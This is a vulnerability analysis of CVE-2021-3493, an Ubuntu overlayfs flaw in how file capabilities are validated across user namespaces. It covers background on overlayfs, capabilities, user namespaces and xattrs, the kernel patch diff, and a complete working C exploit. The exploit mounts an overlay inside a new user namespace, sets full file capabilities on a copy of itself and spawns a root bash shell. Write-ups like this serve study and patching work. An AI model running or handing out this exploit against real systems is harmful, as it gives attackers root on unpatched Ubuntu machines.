# CVE-2021-3493 Vulnerability Analysis  

## Vulnerability description

An Ubuntu-specific issue in the overlayfs filesystem in the Linux kernel, where it was not properly validating applications on filesystem capabilities with respect to user namespaces. Since Ubuntu ships with a patch that allows unprivileged overlayfs mounts, a local attacker can use this to gain elevated privileges. 

## Affected version

    Ubuntu 20.10
    Ubuntu 20.04 LTS
    Ubuntu 18.04 LTS
    Ubuntu 16.04 LTS
    Free 14.04 ES

## Pre-knowledge
### overlayfs
Overlayfs is a kind of stacked file system similar to aufs. It depends on and builds on other file systems (such as ext4fs and xfs, etc.), and does not directly participate in the division of disk space structure. Directories are merged and then presented to the user, so for the user, the content under the root directory of the overlay file system that the user sees comes from the collection of different directories specified at the time of mounting.
here's a picture to show how overlayfs works: 

![overlayfs](https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20210423151537.jpeg)


Among these, the lower dirA / lower dirB directory and the upper dir directory are different directories from the underlying file system, which can be specified by the user. They contain the files and directories that the user wants to merge, and the merge dir directory is the mount point. When the file system is mounted, the content from the lower and upper directories will be seen in the merge directory at the same time, and the user cannot (need not) perceive which files are from the lower dir and which are from the upper dir, what the user sees It's just an ordinary file system root directory.

However, these different directories are not completely equivalent. The upper directory will overwrite the files with the same name in the lower directory, and among the lower files of the same layer, the upper layer will also block the lower file with the same name. And the upper file is readable and writable, when writing the merge file (from the upper mounted file) data will be directly written to the corresponding file; while the lower file is read-only, no matter how the merge file (from the lower mounted file) The uploaded file) is modified, and the original file will not change (the file will be copied to upper during the write operation). In addition, after mounting, it is not allowed to operate on the original lower and upper.

In general, the following three points:

    Merge upper and lower directories with the same name
    Overwrite files with the same name in the upper and lower layers
    lower dir file copy on write

## linux capability control

capability allows normal users to have superuser privileges. Unlike sudo, capability can be assigned a specific permission separately, and does not require the use of a super user; while sudo has all permissions and requires the use of a super user. 

## user namespaces

Used to isolate users and user groups. `/proc/PID/uid_map` and `/proc/PID/gid_map` in the file is information about the mapping settings, and its content is three sets of numbers: `first-ns-id first-target-id count `ã€‚

    first-ns-id: is the first legal ID in the namespace of a given process, often set to 0, which is the root ID, which is legal in the user namespace
    first-target-id: is the real ID in the command space of the parent process (host), first-ns-id will be mapped to the first-target-id in the host
    count: Indicates the scope of the mapping, if it is 1, it means only one is mapped, if it is greater than 1, it means it is mapped in order

## Extended attributes of linux file system

xattr is the full name of file extended attribute, which is a technology to save data to the file system with key-value. Xattr is functionally divided into four categories: user/trusted/system/security. Among these four categories, system is used to save acl, security is used to support selinux, and user/trusted is provided for users to save process settings.

In os, each file system corresponds to a set of setxattr and getxattr commands for reading and writing xattr.

The setxattr function will eventually call the setxattr implemented by each file system through vfs to set its extended attributes. 

## call chain
- setxattr
- vfs_setxattr
- security_inode_setxattr
- cap_inode_setxattr
- ns_capable
- __vfs_setxattr_noperm
- __vfs_setxattr
- ovl_xattr_set
- cap_convert_nscap 

## Patch 
```c
diff --git a/fs/xattr.c b/fs/xattr.c 
index cd7a563e8bcd4..fd57153b1f617  100644 
--- a/fs/xattr.c 
+++ b/fs/xattr.c 
@@  -276 , 8  + 276 , 16  @@ vfs_setxattr(struct dentry *dentry,  const  char  *name,  const  void  *value, 
 { 
 	struct inode *inode = dentry->d_inode; 
 	struct inode *delegated_inode =  NULL ; 
+	 const  void   *orig_value = value; 
 	int  error; 
 
+	 if  ( size  &&  strcmp (name, XATTR_NAME_CAPS) ==  0 ) { 
+		error = cap_convert_nscap(dentry, &value,  size ); 
+		 if  (error <  0 ) 
+			 return  error; 
+		 size  = error; 
+	} 
+ 
 retry_deleg: 
 	inode_lock(inode); 
 	error = __vfs_setxattr_locked(dentry, name, value,  size , flags, 
@@  -289 , 6  + 297 , 9  @@ retry_deleg: 
 		if  (!error) 
 			goto  retry_deleg; 
 	} 
+	 if  (value != orig_value) 
+		kfree(value); 
+ 
 	return  error; 
 } 
 EXPORT_SYMBOL_GPL(vfs_setxattr); 
@@  -537 , 12  + 548 , 6  @@ setxattr(struct dentry *d,  const  char  __user *name,  const  void  __user *value, 
 		if  (( strcmp (kname, XATTR_NAME_POSIX_ACL_ACCESS) ==  0 ) || 
 		    ( strcmp (kname, XATTR_NAME_POSIX_ACL_DEFAULT) ==  0 )) 
 			posix_acl_fix_xattr_from_user(kvalue,  size ); 
-		 else  if  ( strcmp (kname, XATTR_NAME_CAPS) ==  0 ) { 
-			error = cap_convert_nscap(d, &kvalue,  size ); 
-			 if  (error <  0 ) 
-				 goto  out; 
-			 size  = error; 
-		} 
 	} 
 
 	error = vfs_setxattr(d, kname, kvalue,  size , flags); 
diff --git a/include/linux/capability.h b/include/linux/capability.h 
index  1e7 fe311cabe3..b2f698915c0f3  100644 
--- a/include/linux/capability.h 
+++ b/include/linux/capability.h 
@@  -270 , 6  + 270 , 6  @@  static  inline  bool  checkpoint_restore_ns_capable(struct user_namespace *ns) 
 /* audit system wants to get cap info from files as well */ 
 extern  int  get_vfs_caps_from_disk( const  struct dentry *dentry, struct cpu_vfs_cap_data *cpu_caps); 
 
- extern  int  cap_convert_nscap(struct dentry *dentry,  void  **ivalue,  size_t  size ); 
+ extern  int  cap_convert_nscap(struct dentry *dentry,  const  void  **ivalue,  size_t  size ); 
 
 #endif  /* !_LINUX_CAPABILITY_H */ 
diff --git a/security/commoncap.c b/security/commoncap.c 
index  59b f3c1674c8b..bacc1111d871b  100644 
--- a/security/commoncap.c 
+++ b/security/commoncap.c 
@@  -473 , 7  + 473 , 7  @@  static  bool  validheader( size_t  size ,  const  struct vfs_cap_data *cap) 
  * 
  * If all is ok, we  return  the  new  size , on error  return  <  0. 
  */ 
- int  cap_convert_nscap(struct dentry *dentry,  void  **ivalue,  size_t  size ) 
+ int  cap_convert_nscap(struct dentry *dentry,  const  void  **ivalue,  size_t  size ) 
 { 
 	struct vfs_ns_cap_data *nscap; 
 	uid_t  nsrootid; 
@@  -516 , 7  + 516 , 6  @@  int  cap_convert_nscap(struct dentry *dentry,  void  **ivalue,  size_t  size ) 
 	nscap->magic_etc = cpu_to_le32(nsmagic); 
 	memcpy (&nscap->data, &cap->data,  sizeof (__le32) *  2  * VFS_CAP_U32); 
 
-	kvfree(*ivalue); 
 	*ivalue = nscap; 
 	return  newsize; 
 } 
```

## Exploitation 

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mount.h>

//#include <attr/xattr.h>
//#include <sys/xattr.h>
int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);


#define DIR_BASE    "./ovlcap"
#define DIR_WORK    DIR_BASE "/work"
#define DIR_LOWER   DIR_BASE "/lower"
#define DIR_UPPER   DIR_BASE "/upper"
#define DIR_MERGE   DIR_BASE "/merge"
#define BIN_MERGE   DIR_MERGE "/magic"
#define BIN_UPPER   DIR_UPPER "/magic"


static void xmkdir(const char *path, mode_t mode)
{
    if (mkdir(path, mode) == -1 && errno != EEXIST)
        err(1, "mkdir %s", path);
}

static void xwritefile(const char *path, const char *data)
{
    int fd = open(path, O_WRONLY);
    if (fd == -1)
        err(1, "open %s", path);
    ssize_t len = (ssize_t) strlen(data);
    if (write(fd, data, len) != len)
        err(1, "write %s", path);
    close(fd);
}

static void xcopyfile(const char *src, const char *dst, mode_t mode)
{
    int fi, fo;

    if ((fi = open(src, O_RDONLY)) == -1)
        err(1, "open %s", src);
    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
        err(1, "open %s", dst);

    char buf[4096];
    ssize_t rd, wr;

    for (;;) {
        rd = read(fi, buf, sizeof(buf));
        if (rd == 0) {
            break;
        } else if (rd == -1) {
            if (errno == EINTR)
                continue;
            err(1, "read %s", src);
        }

        char *p = buf;
        while (rd > 0) {
            wr = write(fo, p, rd);
            if (wr == -1) {
                if (errno == EINTR)
                    continue;
                err(1, "write %s", dst);
            }
            p += wr;
            rd -= wr;
        }
    }

    close(fi);
    close(fo);
}

static int exploit()
{
    char buf[4096];

    sprintf(buf, "rm -rf '%s/'", DIR_BASE);
    system(buf);

    xmkdir(DIR_BASE, 0777);
    xmkdir(DIR_WORK,  0777);
    xmkdir(DIR_LOWER, 0777);
    xmkdir(DIR_UPPER, 0777);
    xmkdir(DIR_MERGE, 0777);

    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
        err(1, "unshare");

    xwritefile("/proc/self/setgroups", "deny");

    sprintf(buf, "0 %d 1", uid);
    xwritefile("/proc/self/uid_map", buf);

    sprintf(buf, "0 %d 1", gid);
    xwritefile("/proc/self/gid_map", buf);

    sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
    if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
        err(1, "mount %s", DIR_MERGE);

    // all+ep
    char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";

    xcopyfile("/proc/self/exe", BIN_MERGE, 0777);
    if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)
        err(1, "setxattr %s", BIN_MERGE);

    return 0;
}

int main(int argc, char *argv[])
{
    if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "shell"))) {
        setuid(0);
        setgid(0);
        execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
        err(1, "execl /bin/bash");
    }

    pid_t child = fork();
    if (child == -1)
        err(1, "fork");

    if (child == 0) {
        _exit(exploit());
    } else {
        waitpid(child, NULL, 0);
    }

    execl(BIN_UPPER, BIN_UPPER, "shell", NULL);
    err(1, "execl %s", BIN_UPPER);
}
```
Modify the user namespaces so that it has root privileges under another namespace so that the overlay can be mounted.

Use the overlay to copy the exp file, and because the current namespace is a super authority, you can directly set the capability to grant permissions.

Run exp, and the privilege is successfully escalated.

Like Magic 

> made with love by L3mon (Amine)